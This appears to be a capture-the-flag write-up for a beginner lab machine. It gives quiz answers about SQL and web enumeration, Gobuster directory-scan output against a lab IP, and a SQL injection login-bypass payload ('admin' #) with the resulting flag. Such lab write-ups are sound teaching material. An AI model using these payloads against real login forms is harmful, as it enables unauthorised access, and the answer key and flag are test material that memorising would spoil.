# Table of Contents

- [Research](#research)
- [Reproduce](#reproduce)
- [Flag](#flag)

# Research

TASK 1

What does the acronym SQL stand for?

structured query language

TASK 2

What is one of the most common type of SQL vulnerabilities?

sql injection


TASK 3

What does PII stand for?

Personally Identifiable Information

TASK 4

What does the OWASP Top 10 list name the classification for this vulnerability?

A03:2021-Injection

TASK 5

What service and version are running on port 80 of the target?

Apache httpd 2.4.38 ((Debian))



TASK 6

What is the standard port used for the HTTPS protocol?

443

TASK 7

What is one luck-based method of exploiting login pages?

brute-forcing

TASK 8

What is a folder called in web-application terminology?

directory

TASK 9

What response code is given for "Not Found" errors?

404 (Not Found)

TASK 10

What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?

dir

TASK 11

What symbol do we use to comment out parts of the code?

Hash / pound-sign

# Research

    ┌──(kali㉿kali)-[~/HTB-CTF]
    └─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.129.18.200
    ===============================================================
    Gobuster v3.1.0
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.129.18.200
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.1.0
    [+] Timeout:                 10s
    ===============================================================
    2022/05/24 10:02:59 Starting gobuster in directory enumeration mode
    ===============================================================
    /.htaccess            (Status: 403) [Size: 278]
    /.hta                 (Status: 403) [Size: 278]
    /.htpasswd            (Status: 403) [Size: 278]
    /css                  (Status: 301) [Size: 312] [--> http://10.129.18.200/css/]
    /fonts                (Status: 301) [Size: 314] [--> http://10.129.18.200/fonts/]
    /images               (Status: 301) [Size: 315] [--> http://10.129.18.200/images/]
    /index.php            (Status: 200) [Size: 4896]                                  
    /js                   (Status: 301) [Size: 311] [--> http://10.129.18.200/js/]    
    /server-status        (Status: 403) [Size: 278]                                   
    /vendor               (Status: 301) [Size: 315] [--> http://10.129.18.200/vendor/]

    ===============================================================
    2022/05/24 10:03:06 Finished
    ===============================================================
      
Apache 2.4.38 Vulnerability CVE-2019-10097

# Reproduce

Using admin '-- in the login fields does show the login form to be vulnerable to SQL injection.

The following will return the flag

    admin' #

# Flag

e3d0796d002a446c0e622226f42e9672
